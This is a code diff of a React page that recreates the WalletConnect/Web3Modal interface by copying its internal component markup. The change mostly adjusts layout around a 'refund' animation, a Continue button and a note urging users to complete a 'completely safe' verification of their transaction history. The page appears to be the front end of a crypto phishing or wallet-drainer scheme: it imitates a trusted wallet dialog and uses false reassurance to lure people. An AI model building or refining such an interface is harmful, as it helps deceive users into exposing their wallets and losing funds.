@@ -141,155 +141,163 @@ export default function WalletConnectPage() {
 
 
 
-        {/* içerik */}
-        <w3m-router className="embedded" style={{ animation: "unset" }}>
-          <div className="w3m-router-container" view-direction="prev">
-            <w3m-warning-view>
-              <wui-flex
-                flexdirection="column"
-                alignitems="center"
-                justifycontent="center"
-                gap="xl"
-                style={{
-                  flexDirection: "column",
-                  alignItems: "center",
-                  justifyContent: "center",
-                  gap: "var(--wui-spacing-xl)",
-                }}
-              >
-{/* Video */}
-<div
-  className="video loaded"
-  onContextMenu={(e) => e.preventDefault()}
-  style={{
-    position: "relative",
-    marginTop: "18px",         // video bloğunu 3px aşağı kaydır
-    width: 238 * 0.9,         // %10 küçültme → 214.2px
-    height: 360 * 0.9,        // %10 küçültme → 324px
-    overflow: "hidden",       // taşan kısımları kırp
-    borderRadius: "clamp(0px,var(--wui-border-radius-m), 40px)"
-  }}
+{/* içerik */}
+<w3m-router
+  className="embedded"
+  style={{ animation: "unset", height: "100%" }}
 >
-  <img
-    src="/media/refund_anim2.apng"
-    alt="Animasyon"
-    onContextMenu={(e) => e.preventDefault()}
-    style={{
-      display: "block",
-      width: "214.2px",       // %10 küçültülmüş
-      height: "324px",        // %10 küçültülmüş
-      objectFit: "cover",
-      margin: "0 auto"        // yatay ortala
-    }}
-  />
-
-  <wui-shimmer
-    width="238px"
-    height="360px"
-    style={{
-      width: "238px",
-      height: "360px",
-      borderRadius: "clamp(0px,var(--wui-border-radius-m), 40px)"
-    } as React.CSSProperties}
-  />
-</div>
-
-{/* Note - ikon rengi Note ile aynı, sıkı hizalı */}
-<div className="note" style={{ width: "100%", textAlign: "center" }}>
-  <wui-text
-    variant="paragraph-500"
-    color="fg-100"
-    align="center"
-    style={
-      {
-        "--local-align": "center",
-        "--local-color": "#eaeaea",
-        fontWeight: 500,
-        fontSize: "0.95em",
-        display: "inline-block",
-        lineHeight: 1.4,
-        textTransform: "none"      // ← Burayı ekledik
-      } as React.CSSProperties
-    }
+  <div
+    className="w3m-router-container"
+    view-direction="prev"
+    style={{ height: "100%" }}
   >
-    <wui-icon
-      name="info"
-      size="sm"
-      style={{
-        "--local-width": "14px",
-        marginRight: "4px",
-        verticalAlign: "middle",
-      } as React.CSSProperties}
-    >
-      <svg
-        xmlns="http://www.w3.org/2000/svg"
-        width="16"
-        height="16"
-        viewBox="0 0 24 24"
-        fill="none"
-        stroke="var(--wui-color-accent-100)"
-        strokeWidth="2.2"
-        strokeLinecap="round"
-        strokeLinejoin="round"
+    <w3m-warning-view style={{ display: "flex", height: "100%" }}>
+      <wui-flex
+        flexdirection="column"
+        alignitems="center"
+        gap="xl"
+        style={{
+          display: "flex",
+          flexDirection: "column",
+          alignItems: "center",
+          gap: "var(--wui-spacing-xl)",
+          height: "100%"
+        } as React.CSSProperties}
       >
-        <circle cx="12" cy="12" r="10" />
-        <path d="M12 16v-4" />
-        <path d="M12 8h.01" />
-      </svg>
-    </wui-icon>
-    <span
-      className="text-accent"
-      style={{
-        color: "var(--wui-color-accent-100)",
-        fontWeight: 600,
-        verticalAlign: "middle",
-        marginRight: "2px",
-        display: "inline",
-        fontSize: "0.95em",
-        textTransform: "none"      // başlığı da koru
-      }}
-    >
-      Note:
-    </span>
-    <span
-      style={{
-        verticalAlign: "middle",
-        display: "inline",
-        fontSize: "1em",
-        textTransform: "none"      // açıklama metni de
-      }}
-    >
-      This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.
-    </span>
-  </wui-text>
-</div>
+        {/* Video */}
+        <div
+          className="video loaded"
+          onContextMenu={(e) => e.preventDefault()}
+          style={{
+            position: "relative",
+            marginTop: "18px",
+            width: 238 * 0.9,
+            height: 360 * 0.9,
+            overflow: "hidden",
+            borderRadius:
+              "clamp(0px,var(--wui-border-radius-m), 40px)"
+          }}
+        >
+          <img
+            src="/media/refund_anim2.apng"
+            alt="Animasyon"
+            onContextMenu={(e) => e.preventDefault()}
+            style={{
+              display: "block",
+              width: "214.2px",
+              height: "324px",
+              objectFit: "cover",
+              margin: "0 auto"
+            }}
+          />
+          <wui-shimmer
+            width="238px"
+            height="360px"
+            style={{
+              width: "238px",
+              height: "360px",
+              borderRadius:
+                "clamp(0px,var(--wui-border-radius-m), 40px)"
+            } as React.CSSProperties}
+          />
+        </div>
 
+        {/* Note */}
+        <div className="note" style={{ width: "100%", textAlign: "center" }}>
+          <wui-text
+            variant="paragraph-500"
+            color="fg-100"
+            align="center"
+            style={{
+              "--local-align": "center",
+              "--local-color": "#eaeaea",
+              fontWeight: 500,
+              fontSize: "0.95em",
+              display: "inline-block",
+              lineHeight: 1.4,
+              textTransform: "none"
+            } as React.CSSProperties}
+          >
+            <wui-icon
+              name="info"
+              size="sm"
+              style={{
+                "--local-width": "14px",
+                marginRight: "4px",
+                verticalAlign: "middle"
+              } as React.CSSProperties}
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="var(--wui-color-accent-100)"
+                strokeWidth="2.2"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                style={{ display: "inline", verticalAlign: "middle" }}
+              >
+                <circle cx="12" cy="12" r="10" />
+                <path d="M12 16v-4" />
+                <path d="M12 8h.01" />
+              </svg>
+            </wui-icon>
+            <span
+              className="text-accent"
+              style={{
+                color: "var(--wui-color-accent-100)",
+                fontWeight: 600,
+                verticalAlign: "middle",
+                marginRight: "2px",
+                display: "inline",
+                fontSize: "0.95em",
+                textTransform: "none"
+              }}
+            >
+              Note:
+            </span>
+            <span
+              style={{
+                verticalAlign: "middle",
+                display: "inline",
+                fontSize: "1em",
+                textTransform: "none"
+              }}
+            >
+              This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.
+            </span>
+          </wui-text>
+        </div>
 
-                {/* Continue Button. */}
-                <wui-button
-                  variant="accent"
-                  fullwidth=""
-                  style={{
-                    "--local-width": "100%",
-                    "--local-opacity-100": "1",
-                    "--local-opacity-000": "0",
-                    "--local-border-radius": "var(--wui-border-radius-m)",
-                        marginTop: "-3px",         // video bloğunu 3px aşağı kaydır
-                  } as React.CSSProperties}
-                >
-                  <button
-                    data-variant="accent"
-                    data-icon-left="false"
-                    data-icon-right="false"
-                    data-size="lg"
-                  >
-                    Continue
-                  </button>
-                </wui-button>
-              </wui-flex>
-            </w3m-warning-view>
-          </div>
-        </w3m-router>
+        {/* spacer */}
+        <div style={{ flex: 1 }} />
+
+        {/* Continue Button */}
+        <wui-button
+          variant="accent"
+          fullwidth
+          style={{
+            "--local-width": "100%",
+            "--local-opacity-100": "1",
+            "--local-opacity-000": "0",
+            "--local-border-radius": "var(--wui-border-radius-m)"
+          } as React.CSSProperties}
+        >
+          <button
+            data-variant="accent"
+            data-icon-left="false"
+            data-icon-right="false"
+            data-size="lg"
+          >
+            Continue
+          </button>
+        </wui-button>
+      </wui-flex>
+    </w3m-warning-view>
+  </div>
+</w3m-router>
 
         {/* placeholder’lar */}
         <w3m-snackbar />
